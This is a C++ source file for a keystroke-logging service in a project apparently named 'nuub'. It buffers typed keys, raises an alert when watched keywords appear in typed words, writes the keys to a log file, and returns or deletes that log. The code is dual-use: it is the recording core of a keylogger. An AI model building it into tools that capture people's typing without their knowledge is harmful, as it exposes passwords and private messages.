#include "domain/services/KeystrokeService.hpp"

#include <algorithm>
#include <fstream>

namespace nuub::domain::services {

KeystrokeService::KeystrokeService(const std::string& log_path, size_t max_buffer)
    : log_path_(log_path)
    , max_buffer_size_(max_buffer)
    , persistence_enabled_(!log_path.empty())
{
}

void KeystrokeService::check_keywords(const std::string& key) {
    // Must be called with mutex_ held
    if (keywords_.empty() || !keyword_callback_) return;

    std::string word;
    for (auto it = buffer_.rbegin(); it != buffer_.rend(); ++it) {
        const auto& k = it->key;
        if (k == " " || k == "\n" || k == "\t") break;
        word = k + word;
    }

    std::string lower_word = word;
    std::transform(lower_word.begin(), lower_word.end(), lower_word.begin(), ::tolower);

    for (const auto& kw : keywords_) {
        std::string lower_kw = kw;
        std::transform(lower_kw.begin(), lower_kw.end(), lower_kw.begin(), ::tolower);
        if (lower_word.find(lower_kw) != std::string::npos) {
            keyword_callback_("Keyword detected: '" + kw + "' in context: '" + word + "'");
            return;
        }
    }
}

void KeystrokeService::flush_to_disk() {
    if (!persistence_enabled_ || log_path_.empty()) return;

    std::ofstream ofs(log_path_, std::ios::app);
    if (!ofs.is_open()) return;

    for (const auto& entry : buffer_) {
        ofs << entry.key;
    }
    ofs.flush();
}

void KeystrokeService::rotate_if_needed() {
    if (buffer_.size() <= max_buffer_size_) return;

    // Flush current buffer to disk, then clear
    flush_to_disk();
    buffer_.clear();
}

void KeystrokeService::process_press(const std::string& key) {
    if (paused_) return;
    if (key.empty()) return;

    std::lock_guard lock(mutex_);
    buffer_.emplace_back(key);
    check_keywords(key);
    rotate_if_needed();
}

void KeystrokeService::process_release(const std::string& /*key*/) {
}

void KeystrokeService::pause() { paused_ = true; }
void KeystrokeService::resume() { paused_ = false; }
bool KeystrokeService::is_paused() const { return paused_; }

std::string KeystrokeService::get_log() {
    std::lock_guard lock(mutex_);
    std::string result;

    // First read from disk (if persistence enabled)
    if (persistence_enabled_ && !log_path_.empty()) {
        std::ifstream ifs(log_path_);
        if (ifs.is_open()) {
            result.assign(std::istreambuf_iterator<char>(ifs),
                         std::istreambuf_iterator<char>());
        }
    }

    // Then append in-memory buffer
    for (const auto& entry : buffer_) result += entry.key;
    return result;
}

std::string KeystrokeService::clear_log() {
    std::lock_guard lock(mutex_);
    std::string result;

    // Read from disk first
    if (persistence_enabled_ && !log_path_.empty()) {
        std::ifstream ifs(log_path_);
        if (ifs.is_open()) {
            result.assign(std::istreambuf_iterator<char>(ifs),
                         std::istreambuf_iterator<char>());
        }
        // Delete the log file
        std::remove(log_path_.c_str());
    }

    // Append in-memory buffer
    for (const auto& entry : buffer_) result += entry.key;
    buffer_.clear();
    return result;
}

void KeystrokeService::add_keyword(const std::string& keyword) {
    std::lock_guard lock(mutex_);
    keywords_.insert(keyword);
}

void KeystrokeService::remove_keyword(const std::string& keyword) {
    std::lock_guard lock(mutex_);
    keywords_.erase(keyword);
}

std::vector<std::string> KeystrokeService::get_keywords() const {
    std::lock_guard lock(mutex_);
    return {keywords_.begin(), keywords_.end()};
}

void KeystrokeService::set_keyword_callback(std::function<void(const std::string&)> callback) {
    std::lock_guard lock(mutex_);
    keyword_callback_ = std::move(callback);
}

void KeystrokeService::enable_persistence(const std::string& log_path, size_t max_buffer) {
    std::lock_guard lock(mutex_);
    log_path_ = log_path;
    max_buffer_size_ = max_buffer;
    persistence_enabled_ = !log_path.empty();
}

size_t KeystrokeService::buffer_size() const {
    std::lock_guard lock(mutex_);
    return buffer_.size();
}

} // namespace nuub::domain::services
